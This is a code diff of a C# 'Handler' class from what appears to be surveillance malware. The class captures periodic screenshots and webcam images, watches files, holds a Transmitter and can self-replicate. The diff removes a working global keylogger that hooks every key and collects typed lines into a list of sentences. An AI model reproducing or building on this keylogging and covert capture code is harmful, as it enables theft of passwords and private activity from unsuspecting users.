@@ -11,40 +11,22 @@ using System.Windows.Forms;
 
 namespace Library
 {
-    public delegate void OnReturnDelegate(object sender, string sentence);
     public delegate void OnScreenshotDelegate(object sender, System.Drawing.Bitmap bitmapImage);
     public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
 
     public class Handler
     {
         private bool isQuitting = false;
-        private string tempSentence;
-        public List<string> Sentences { get; private set; }
         public Transmitter Transmitter { get; set; }
         public System.Drawing.Bitmap Screenshot { get; private set; }
         public FileDirHandler FileDirInfo { get; private set; }
         private FileSystemWatcher watcher;
-        private GlobalKeyboardHook gHook;
         private Timer screenShotTimer;
         private Image webcamImage;
         private WebCam webcam;
 
-        public event OnReturnDelegate OnReturn;
         public event OnScreenshotDelegate OnScreenshot;
         public event OnFileEventDelegate OnFileEvent;
-
-        public GlobalKeyboardHook GHook { get { return gHook; } }
-        public string TempSentence
-        {
-            get
-            {
-                return tempSentence;
-            }
-            private set
-            {
-                tempSentence = value;
-            }
-        }
 
         #region Singleton
         private static Handler instance;
@@ -66,32 +48,12 @@ namespace Library
 
         private Handler()
         {
-            Sentences = new List<string>();
             FileDirInfo = new FileDirHandler();
             watcher = new FileSystemWatcher();
             screenShotTimer = new Timer();
             screenShotTimer.Tick += screenShotTimer_Tick;
         }
         #endregion
-
-        public void StartKeyLogger()
-        {
-            gHook = new GlobalKeyboardHook(); // Create a new GlobalKeyboardHook
-            // Declare a KeyDown Event
-            gHook.KeyDown += gHook_KeyDown;
-            // Add the keys you want to hook to the HookedKeys list
-            foreach (Keys key in Enum.GetValues(typeof(Keys)))
-            {
-                gHook.HookedKeys.Add(key);
-            }
-            gHook.unhook();
-            gHook.hook();
-        }
-
-        public void StopKeyLogger()
-        {
-            gHook.unhook();
-        }
 
         public void StartExceptionHandling()
         {
@@ -177,23 +139,10 @@ namespace Library
 
         private void Replicate()
         {
-            gHook.unhook();
             DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
             if (dr == System.Windows.Forms.DialogResult.Yes)
             {
                 Replicator.Instance.Replicate(true);
-            }
-        }
-
-        // Handle the KeyDown Event
-        void gHook_KeyDown(object sender, KeyEventArgs e)
-        {
-            TempSentence += ((char)e.KeyValue).ToString();
-            if (e.KeyCode == Keys.Return)
-            {
-                Sentences.Add(TempSentence);
-                OnReturn(this, TempSentence);
-                TempSentence = String.Empty;
             }
         }
 
